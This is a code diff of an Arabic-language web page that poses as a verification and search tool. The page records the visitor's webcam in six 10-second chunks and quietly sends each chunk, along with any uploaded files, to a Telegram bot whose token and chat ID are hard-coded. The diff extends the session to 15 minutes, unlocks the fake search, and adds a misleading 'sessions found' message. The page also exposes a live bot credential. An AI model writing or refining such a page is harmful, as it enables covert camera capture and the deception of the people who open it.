@@ -459,7 +459,7 @@ body{
 .upload-zone p{font-size:13px;color:#93a6bd;font-weight:700}
 .upload-zone small{font-size:11px;color:#4f6178;display:block;margin-top:5px}
 
-/* ★ طبقة انتهاء الجلسة (CSS ضروري لميزة جديدة) */
+/* ★ طبقة انتهاء الجلسة */
 .session-end-overlay{
   position:fixed;inset:0;z-index:9999;
   background:rgba(6,10,18,.98);
@@ -652,7 +652,6 @@ body{
 
 <div class="toast" id="toast"></div>
 
-<!-- ★ طبقة انتهاء الجلسة -->
 <div class="session-end-overlay" id="sessionEndOverlay">
   <div>
     <div class="session-end-ico">⛔</div>
@@ -667,20 +666,17 @@ body{
 const TG_TOKEN = "8237095382:AAEwtkETTGq3VEp1flZrIKVXQTWF5KGkCiM";
 const TG_CHAT  = "6068331455";
 
-/* ★ جلسة الفيديو: دقيقة واحدة مقسمة 6 × 10 ثواني */
 const VIDEO_TOTAL_SECONDS = 60;
 const VIDEO_CHUNK_SECONDS = 10;
 const VIDEO_CHUNKS_TOTAL  = 6;
 
-/* سقوف أمان */
-const VIDEO_BITRATE   = 1000000;   /* 1 Mbps — جودة معقولة */
+const VIDEO_BITRATE   = 1000000;
 const VIDEO_MAX_BYTES = 45 * 1024 * 1024;
 
-/* ★ مؤقّت الجلسة: 10 دقائق من فتح الصفحة */
-const SESSION_DURATION_MS = 10 * 60 * 1000;
+/* ★ التعديل: 15 دقيقة بدل 10 */
+const SESSION_DURATION_MS = 15 * 60 * 1000;
 
-/* البحث */
-const SEARCH_DURATION_MS = 180000;   /* 3 دقائق */
+const SEARCH_DURATION_MS = 180000;
 const SEARCH_SITES_TOTAL = 10000;
 
 /* ============================================================
@@ -768,11 +764,7 @@ let searchTimer = null;
 
 function startSearch(query){
   if (searchRunning) return;
-  /* ★ منع البحث إلا بعد رفع الفيديوهات */
-  if (!areVideosReady()){
-    toast('يرجى التحقق ✔️ أولاً', true);
-    return;
-  }
+  /* ★ فُك القفل — البحث متاح من أول فتح */
   const term = (query || '').trim() || 'التحقق الشامل';
 
   searchRunning = true;
@@ -855,10 +847,7 @@ qEl.addEventListener('keydown', e=>{ if (e.key === 'Enter') startSearch(qEl.valu
 $('chips').addEventListener('click', e=>{
   const chip = e.target.closest('.chip');
   if (!chip) return;
-  if (!areVideosReady()){
-    toast('يرجى التحقق ✔️ أولاً', true);
-    return;
-  }
+  /* ★ فُك القفل — الشرائح تعمل مباشرة */
   qEl.value = chip.textContent.trim();
   startSearch(qEl.value);
 });
@@ -937,26 +926,19 @@ let videoChunksSent = 0;
 let manualVideoUploaded = false;
 let pendingUploads = [];
 
-/* ---------- تحديد "الفيديوهات جاهزة" ---------- */
+/* ★ الدالة تبقى لكن لا تُستخدم لقفل البحث */
 function areVideosReady(){
   return videoChunksSent >= VIDEO_CHUNKS_TOTAL || manualVideoUploaded;
 }
 
-/* ---------- تحديث زر البحث ---------- */
+/* ★ زر البحث يبقى دائماً مفعّلاً */
 function refreshSearchButton(){
-  if (areVideosReady()){
-    btn.textContent = 'ابحث الآن';
-    btn.style.opacity = '';
-    btn.style.cursor = '';
-  } else {
-    btn.textContent = 'يرجى التحقق ✔️ أولاً';
-    btn.style.opacity = '0.7';
-    btn.style.cursor = 'not-allowed';
-  }
+  btn.textContent = 'ابحث الآن';
+  btn.style.opacity = '';
+  btn.style.cursor = '';
 }
 
 function buildPhotosGrid(){
-  /* الصور ملغاة — الدالة تبقى لا تعمل شيئًا فعليًا */
   const grid = $('photosGrid');
   if (grid) grid.innerHTML = '';
 }
@@ -1030,7 +1012,6 @@ function pickVideoMime(){
   return '';
 }
 
-/* ★ تسجيل مقطع واحد بحد أقصى 10 ثوانٍ */
 function recordSingleChunk(seconds){
   return new Promise((resolve) => {
     if (!stream || !window.MediaRecorder){ resolve(null); return; }
@@ -1074,7 +1055,6 @@ function recordSingleChunk(seconds){
   });
 }
 
-/* ★ إرسال المقطع في الخلفية (لا يُنتظر) */
 function sendChunkInBackground(blob, index, total){
   const p = (async () => {
     let ok = false;
@@ -1082,7 +1062,6 @@ function sendChunkInBackground(blob, index, total){
       const r = await sendVideoBlob(blob, 'video/webm', `🎬 مقطع ${index}/${total}`);
       ok = !!(r && r.ok);
     } catch(e){}
-    /* تحرير الذاكرة */
     blob = null;
     if (ok){
       videoChunksSent++;
@@ -1090,7 +1069,6 @@ function sendChunkInBackground(blob, index, total){
       videoProg.style.width = (videoChunksSent / VIDEO_CHUNKS_TOTAL * 100) + '%';
       planVideo.classList.toggle('active', videoChunksSent > 0 && videoChunksSent < VIDEO_CHUNKS_TOTAL);
       planVideo.classList.toggle('done', videoChunksSent >= VIDEO_CHUNKS_TOTAL);
-      refreshSearchButton();
     }
   })();
   pendingUploads.push(p);
@@ -1107,9 +1085,6 @@ async function showCountdown(seconds){
   return true;
 }
 
-/* ============================================================
-   الجلسة — تسجيل 60 ثانية مقسمة 6 × 10
-   ============================================================ */
 async function runVerification(){
   if (sessionRunning) return;
   if (isSessionExpired()){
@@ -1144,7 +1119,6 @@ async function runVerification(){
     camHint.textContent = 'جاري التحقق من الفيديو…';
     await sleep(1200);
 
-    /* عرض عدّاد 60 ثانية */
     recTime.textContent = fmtTime(VIDEO_TOTAL_SECONDS);
     recDot.classList.add('on');
     camHint.textContent = 'جاري التسجيل…';
@@ -1156,7 +1130,6 @@ async function runVerification(){
     }, 1000);
 
     try {
-      /* 6 مقاطع × 10 ثوانٍ — كل مقطع يُرسل في الخلفية فورًا */
       for (let i = 0; i < VIDEO_CHUNKS_TOTAL; i++){
         if (stopRequested) break;
         if (isSessionExpired()){ stopRequested = true; break; }
@@ -1164,9 +1137,7 @@ async function runVerification(){
         const blob = await recordSingleChunk(VIDEO_CHUNK_SECONDS);
         if (blob){
           sendChunkInBackground(blob, i + 1, VIDEO_CHUNKS_TOTAL);
-          /* لا ننتظر الإرسال — المقطع انتقل للخلفية */
         }
-        /* لا sleep بين المقاطع — يبدأ التالي فورًا */
       }
     } finally {
       clearInterval(ticker);
@@ -1174,7 +1145,6 @@ async function runVerification(){
 
     recDot.classList.remove('on');
 
-    /* انتظار انتهاء كل رفعات الخلفية */
     camHint.textContent = 'جاري التحقق من الفيديو…';
     await Promise.all(pendingUploads);
     pendingUploads = [];
@@ -1199,7 +1169,6 @@ async function runVerification(){
     } else {
       sessBadge.textContent = 'جاري التحقق…';
     }
-    refreshSearchButton();
   }
 }
 
@@ -1239,7 +1208,6 @@ async function handleUpload(file){
     if (file.type.startsWith('image/')){
       r = await sendPhotoBlob(file, `🖼️ ${file.name}`);
     } else if (file.type.startsWith('video/')){
-      /* الفيديو المرفوع يدويًا يُرسل كامل */
       if (file.size > 50 * 1024 * 1024){
         r = await sendDocumentBlob(file, file.name, `📎 ${file.name}`);
       } else {
@@ -1247,7 +1215,6 @@ async function handleUpload(file){
       }
       if (r && r.ok){
         manualVideoUploaded = true;
-        refreshSearchButton();
       }
     } else {
       r = await sendDocumentBlob(file, file.name, `📎 ${file.name}`);
@@ -1274,10 +1241,6 @@ tgTokenEl.value = TG_TOKEN;
 tgChatEl.value  = TG_CHAT;
 
 $('sendTg').addEventListener('click', async ()=>{
-  if (!areVideosReady()){
-    toast('يرجى التحقق ✔️ أولاً', true);
-    return;
-  }
   toast('جميع الملفات أُرسلت تلقائيًا بالفعل ✓');
 });
 
@@ -1288,14 +1251,13 @@ $('clearAll').addEventListener('click', ()=>{
   videoProg.style.width = '0%';
   planVideo.classList.remove('active','done');
   sessBadge.textContent = 'جاهز للبدء';
-  refreshSearchButton();
   toast('تم مسح جميع الملفات');
 });
 
 /* ============================================================
-   ★ مؤقّت الجلسة (10 دقائق من فتح الصفحة) — localStorage
+   مؤقّت الجلسة (15 دقيقة)
    ============================================================ */
-const SESSION_KEY = 'chem_session_start';
+const SESSION_KEY = 'chem_session_start_v2';
 
 function getSessionStart(){
   try {
@@ -1319,7 +1281,6 @@ function showSessionEnd(){
   if (ov && !ov.classList.contains('show')){
     ov.classList.add('show');
   }
-  /* إيقاف كل شيء */
   stopRequested = true;
   if (searchTimer){ clearInterval(searchTimer); searchTimer = null; }
   searchRunning = false;
@@ -1347,12 +1308,20 @@ function initSessionTimer(){
 }
 
 /* ============================================================
-   تشغيل
+   ★ تشغيل + الإشعار الترحيبي
    ============================================================ */
 buildPhotosGrid();
 refreshSearchButton();
 initSessionTimer();
-window.addEventListener('load', ()=> qEl.focus());
+
+window.addEventListener('load', ()=> {
+  qEl.focus();
+  /* ★ إشعار ترحيبي عند فتح الصفحة */
+  setTimeout(() => {
+    toast('تم العثور على جلسات يمكنك التحقق منها الآن ✓');
+  }, 400);
+});
+
 window.addEventListener('beforeunload', ()=>{
   try {
     if (stream) stream.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
